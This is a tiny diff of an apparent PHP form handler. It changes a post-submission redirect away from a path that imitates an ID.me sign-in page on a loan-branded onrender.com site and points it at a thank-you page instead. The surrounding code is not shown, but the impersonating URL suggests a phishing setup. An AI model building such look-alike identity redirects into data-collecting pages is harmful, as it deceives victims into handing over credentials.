@@ -201,7 +201,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
 
-header("Location:https://upstart-loans.onrender.com/api.id.me/en/session/new.php");
+header("Location:https://upstart-loans.onrender.com/thankyou.html");
 
 exit;
 }
